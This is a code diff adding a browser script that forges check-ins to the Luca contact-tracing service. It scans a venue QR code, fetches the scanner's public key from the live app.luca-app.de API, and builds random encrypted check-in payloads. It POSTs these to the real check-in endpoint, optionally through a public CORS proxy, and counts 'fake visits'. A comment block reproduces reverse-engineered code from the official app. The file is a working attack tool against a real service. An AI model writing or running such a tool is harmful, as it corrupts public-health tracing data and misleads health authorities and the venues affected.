@@ -1,0 +1,366 @@
+QrScanner.WORKER_PATH = "./libs/qr-scanner.worker.min.js";
+
+let hasCamera = false,
+    lastState = {result: null, error: null, scannerId: null, canGenerateFakeCheckin: false, fakeVists: 0},
+    useCorsProxy = false;
+
+const iScannerLink = document.getElementById("i-scannerLink"),
+    btnCheckin = document.getElementById("btn-checkin"),
+    btnGenerate = document.getElementById("btn-generate"),
+    video = document.getElementById('qr-video'),
+    fileSelector = document.getElementById('i-qrfile'),
+    scannerError = document.getElementById('scanner-error'),
+    scannerId = document.getElementById('scannerId'),
+    toggleScanner = document.getElementById('btn-toggleScanner'),
+    generatedVisits = document.getElementById('generatedVisits'),
+    btnToggleProxy = document.getElementById('btn-toggleProxy');
+
+function setCanGenerateFakeCheckin(b) {
+    lastState.canGenerateFakeCheckin = b;
+    btnGenerate.disabled = !b;
+}
+
+function incrementFakeVists() {
+    lastState.fakeVists += 1;
+    generatedVisits.innerText = lastState.fakeVists;
+}
+
+function askForCameraAndStart() {
+    const scanner = new QrScanner(video, result => {
+        reportQrCodeResult(result)
+    }, error => {
+        reportError(error)
+    });
+    QrScanner.hasCamera().then(r => hasCamera = r);
+    scanner.start();
+    window.scanner = scanner;
+}
+
+/*toggleScanner.onclick = () => {
+    if (window.scanner._active) {
+        window.scanner.stop();
+    } else {
+        window.scanner.start();
+    }
+}*/
+
+fileSelector.addEventListener('change', event => {
+    const file = fileSelector.files[0];
+    if (!file) {
+        return;
+    }
+    QrScanner.scanImage(file)
+        .then(result => reportQrCodeResult(result))
+        .catch(e => reportError(e || 'No QR code found.'));
+});
+
+btnToggleProxy.onclick = () => {
+    if (useCorsProxy) {
+        useCorsProxy = false;
+        btnToggleProxy.innerText = 'Enable CORS proxy';
+    } else {
+        useCorsProxy = true;
+        btnToggleProxy.innerText = 'Disable CORS proxy';
+    }
+}
+
+function reportQrCodeResult(r) {
+    console.log(r)
+    lastState.error = null;
+    scannerError.innerHTML = null;
+    if (lastState.result !== r) {
+        lastState.result = r;
+        reportNewScanner(r);
+    }
+}
+
+function reportError(e) {
+    if (e === 'No QR code found.') return;
+    console.error(e)
+    lastState.result = null;
+    if (lastState.error !== e) {
+        lastState.error = e;
+        scannerError.innerHTML = "<b>ERROR: </b>";
+        scannerError.innerText += e;
+        setCanGenerateFakeCheckin(false);
+        scannerId.innerHTML = null;
+    }
+}
+
+function reportNewScanner(url) {
+    const u = new URL(url);
+    const parts = u.pathname.split("/");
+    if (parts.length < 3) {
+        return reportError("Invalid URL scanned.");
+    }
+    lastState.scannerId = parts[2];
+    scannerId.innerText = lastState.scannerId;
+    setCanGenerateFakeCheckin(true);
+}
+
+btnGenerate.disabled = true;
+
+btnGenerate.onclick = () => {
+    generateFakeVisitFor(lastState.scannerId)
+}
+
+btnCheckin.onclick = () => {
+    reportNewScanner(iScannerLink.value)
+}
+
+function makeUrl(url) {
+    if (useCorsProxy) {
+        return 'https://cors.bridged.cc/' + url;
+    }
+    return url;
+}
+
+function generateFakeVisitFor(id) {
+    fetch(makeUrl("https://app.luca-app.de/api/v3/scanners/" + id))
+        .then(r => {
+            r.json().then(
+                j => {
+                    fetch(makeUrl("https://app.luca-app.de/api/v3/traces/checkin"), {
+                        method: "POST",
+                        headers: {
+                            "Accept": "application/json",
+                            "Content-Type": "application/json",
+                        },
+                        body: JSON.stringify(buildCheckin(
+                            {
+                                publicKey: j.publicKey,
+                                scannerId: j.scannerId
+                            },
+                            ge(makeCode())
+                        ))
+                    }).then(r => {
+                        console.log(r)
+                        incrementFakeVists();
+                    }).catch(e => {
+                        console.error(e)
+                    })
+                }
+            )
+        }).catch(e => {
+        console.error(e)
+    })
+}
+
+function makeCode() {
+    /* code from https://wolf128058.gitlab.io/schmudo2go/ */
+    /* modified to be combined into 1 function */
+    const charset = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-:+=^!/*?&<>()[]{}@%$#';
+    const h = {
+        getRanHex: (size) => {
+            let result = [];
+            let hexRef = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'];
+
+            for (let n = 0; n < size; n++) {
+                result.push(hexRef[Math.floor(Math.random() * 16)]);
+            }
+            return result.join('');
+        },
+        encode: (buf) => {
+            if (buf.length % 4) return
+
+            var byte_nbr = 0
+            var buf_len = buf.length
+            var val = 0, idx, div
+
+            var dest = ''
+
+            while (byte_nbr < buf_len) {
+                val = (val * 256) + buf[byte_nbr++]
+                if (byte_nbr % 4) continue
+                div = 85 * 85 * 85 * 85
+                while (div >= 1) {
+                    idx = Math.floor(val / div) % 85
+                    dest += charset[idx]
+                    div /= 85
+                }
+                val = 0
+            }
+
+            return dest
+        },
+        parseHexString: (str) => {
+            var result = [];
+            while (str.length >= 2) {
+                result.push(parseInt(str.substring(0, 2), 16));
+                str = str.substring(2, str.length);
+            }
+
+            return result;
+        }
+    };
+    let snakeoil = '030101';
+    let tshex = Math.floor(Date.now() / 1000).toString(16);
+    tshex = tshex.match(/(..?)/g).reverse().join("");
+    snakeoil += tshex;
+    snakeoil += h.getRanHex(178);
+    snakeoil += forge.util.bytesToHex(sha256(h.parseHexString(snakeoil))).slice(0, 8)
+    return snakeoil;
+}
+
+/*
+      These are some random notes from the original luca app source code.
+	
+	        Object(ae.z85ToBytes)(<The scanned QR Code data>)
+	
+	        ge(e, t)
+	        e.data = the qr code bytes as an buffer
+	            // the first byte gets lost from an function before
+	        t = qrcode as bytes from the z85ToBytes
+	        var n = e.getByte(); // we just lose an additional byte here
+	            // nothing we actually use
+	            if (2 === n) {
+	                var a = e.getByte()
+	                  , r = Object(ae.bytesToBase64)(e.getBytes(16))
+	                  , c = Object(ae.bytesToBase64)(e.getBytes(32))
+	                  , i = Object(ae.bytesToBase64)(e.getBytes(33))
+	                  , s = e.getByte()
+	                  , o = Object(ae.bytesToBase64)(e.getBytes(s))
+	                  , d = e.getByte();
+	                e.getBytes(d);
+	                var u = Object(ae.bytesToHex)(e.getBytes(4))
+	                  , l = Object(ae.bytesToHex)(t).slice(0, 2 * t.length - 8);
+	                return Object(ae.SHA256)(l).slice(0, 8) !== u ? null : Object(ae.VERIFY_EC_SHA256_DER_SIGNATURE)(Object(ae.base64ToHex)("BJhA/0GVMqiM7/HNrZ3xFP+LDIGKIOkc1ybCTmWzBKRVMZsVKWUBhDxuiNOaPqHxXn/5zNistW8jEZjvmhhXYFA="), Object(ae.base64ToHex)(c), Object(ae.base64ToHex)(o)) ? {
+	                    v: 3,
+	                    deviceType: n,
+	                    keyId: a,
+	                    tracingSeed: r,
+	                    data: c,
+	                    publicKey: i,
+	                    signature: o
+	                } : null
+	            }
+	
+	            getInt32Le = {
+	                var e = this.data.charCodeAt(this.read) ^ this.data.charCodeAt(this.read + 1) << 8 ^ this.data.charCodeAt(this.read + 2) << 16 ^ this.data.charCodeAt(this.read + 3) << 24;
+	                return this.read += 4,
+	                e
+	            }
+	
+	            var b = e.getByte()
+	              , j = e.getInt32Le() // read 4 bytes as an 32bit integer
+	              , f = Object(ae.bytesToBase64)(e.getBytes(16))
+	              , h = Object(ae.bytesToBase64)(e.getBytes(32))
+	              , p = Object(ae.bytesToBase64)(e.getBytes(33))
+	              , x = Object(ae.bytesToBase64)(e.getBytes(8))
+	              , O = Object(ae.bytesToHex)(e.getBytes(4))
+	              , m = Object(ae.bytesToHex)(t).slice(0, 2 * t.length - 8);
+	            return Object(ae.SHA256)(m).slice(0, 8) !== O ? null : {
+	                v: 3,
+	                data: h,
+	                keyId: b,
+	                traceId: f,
+	                publicKey: p,
+	                timestamp: j,
+	                deviceType: n,
+	                verificationTag: x
+	            }
+	
+	
+	        Te() bzw. se(e, t)
+	        e = data from /api/v3/scanners/access/ with the id from the url /scanner/cam/...
+	        t = {data: ..., deviceType: 1, keyId: 1, publicKey: ..., timestamp: ..., traceId: ..., v: 3, ..., verificationTag: ...}
+	
+	        var n = "03".concat(Object(ae.int8ToHex)(t.keyId)).concat(Object(ae.base64ToHex)(t.publicKey)).concat(Object(ae.base64ToHex)(t.verificationTag)).concat(Object(ae.base64ToHex)(t.data))
+	              , a = Object(ae.ENCRYPT_DLIES)(Object(ae.base64ToHex)(e.publicKey), n)
+	              , r = a.publicKey
+	              , c = a.data
+	              , i = a.iv
+	              , s = a.mac;
+	            return {
+	                traceId: t.traceId,
+	                scannerId: e.scannerId,
+	                timestamp: t.timestamp,
+	                data: Object(ae.hexToBase64)(c),
+	                iv: Object(ae.hexToBase64)(i),
+	                mac: Object(ae.hexToBase64)(s),
+	                publicKey: Object(ae.hexToBase64)(r),
+	                deviceType: t.deviceType
+	            }
+	
+	            ENCRYPT_DLIES(e, n):
+	
+	            var r = t.EC_KEYPAIR_GENERATE(), o = t.ECDH(r.privateKey, e), i = t.KDF_SHA256(o, "01").slice(0, 32),
+	            a = t.KDF_SHA256(o, "02"), s = t.GET_RANDOM_BYTES(16), c = t.ENCRYPT_AES_CTR(n, i, s),
+	            u = t.HMAC_SHA256(c, a);
+	            return {publicKey: r.publicKey, data: c, iv: s, mac: u}
+*/
+
+function encrypt_aes_ctr(e, t, n) {
+    var r = forge.cipher.createCipher("AES-CTR", forge.util.hexToBytes(t));
+    r.start({iv: forge.util.hexToBytes(n)});
+    r.update(forge.util.createBuffer(forge.util.hexToBytes(e)));
+    r.finish();
+    return r.output.toHex()
+}
+
+function encrypt_dlies(publicKey, data) {
+    const ecdh = new elliptic.ec("p256");
+    const keys = ecdh.genKeyPair();
+    const o = keys.derive(ecdh.keyFromPublic(publicKey, "hex").getPublic()).toString("hex");
+    const i = forge.util.bytesToHex(sha256(o + "01")).slice(0, 32);
+    const a = forge.util.bytesToHex(sha256(o + "02"));
+    const s = forge.util.bytesToHex(forge.random.getBytesSync(16));
+    const c = encrypt_aes_ctr(data, i, s);
+    let u = forge.hmac.create();
+    u.start("sha256", a);
+    u.update(c);
+    u = u.digest().toHex();
+    console.log(c)
+    return {publicKey: keys.getPublic('hex'), data: c, iv: s, mac: u}
+
+}
+
+function ge(qr) {
+    const bytes = forge.util.hexToBytes(qr)
+    let e = forge.util.createBuffer(bytes);
+    e.getBytes(2)
+    const b = e.getByte()
+        , j = e.getInt32Le() // read 4 bytes as an 32bit integer
+        , f = forge.util.encode64(e.getBytes(16))
+        , h = forge.util.encode64(e.getBytes(32))
+        , p = forge.util.encode64(e.getBytes(33))
+        , x = forge.util.encode64(e.getBytes(8))
+        , O = forge.util.bytesToHex(e.getBytes(4))
+        , m = forge.util.bytesToHex(bytes).slice(0, 2 * bytes.length - 8);
+
+    return {
+        v: 3,
+        data: h,
+        keyId: b,
+        traceId: f,
+        publicKey: p,
+        timestamp: j,
+        deviceType: 1,
+        verificationTag: x
+    }
+
+}
+
+function buildCheckin(scannerInfo, qrDetails) {
+    const n = "03"
+        .concat(forge.util.bytesToHex([qrDetails.keyId]))
+        .concat(forge.util.bytesToHex(forge.util.decode64(scannerInfo.publicKey)))
+        .concat(forge.util.bytesToHex(forge.util.decode64(qrDetails.verificationTag)))
+    //.concat(forge.util.bytesToHex(forge.util.decode64(qrDetails.data))); // haven't found the issue here, but makes the data stuff too long
+    const a = encrypt_dlies(forge.util.bytesToHex(forge.util.decode64(scannerInfo.publicKey)), n);
+    const r = a.publicKey;
+    const c = a.data;
+    const i = a.iv;
+    const s = a.mac;
+
+    return {
+        traceId: qrDetails.traceId,
+        scannerId: scannerInfo.scannerId,
+        timestamp: qrDetails.timestamp,
+        data: forge.util.encode64(forge.util.hexToBytes(c)),
+        iv: forge.util.encode64(forge.util.hexToBytes(i)),
+        mac: forge.util.encode64(forge.util.hexToBytes(s)),
+        publicKey: forge.util.encode64(forge.util.hexToBytes(r)),
+        deviceType: qrDetails.deviceType
+    }
+}
